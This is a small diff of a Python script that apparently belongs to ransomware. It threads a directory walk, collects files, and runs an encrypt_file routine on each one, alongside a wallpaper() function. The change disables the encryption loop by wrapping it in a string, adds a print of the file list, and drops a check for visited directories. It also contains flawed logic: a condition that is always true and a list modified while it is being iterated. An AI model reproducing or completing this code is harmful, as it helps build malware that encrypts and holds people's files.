@@ -65,8 +65,6 @@ wallpaper()
 if len(DIRS) >= 0:
         threads = []
         for d in DIRS:
-                if d in ALREADY:
-                        continue
                 t = threading.Thread(target=listdir, args=(d,))
                 t.start()
                 DIRS.remove(d)
@@ -74,6 +72,8 @@ if len(DIRS) >= 0:
         for t in threads:
                 t.join()
 
+print (FILES)
+'''
 ts = []
 for f in FILES:
         t = threading.Thread(target=encrypt_file, args=(f,))
@@ -82,4 +82,4 @@ for f in FILES:
         ts.append(t)
 for t in ts:
         t.join()
-                   
+'''
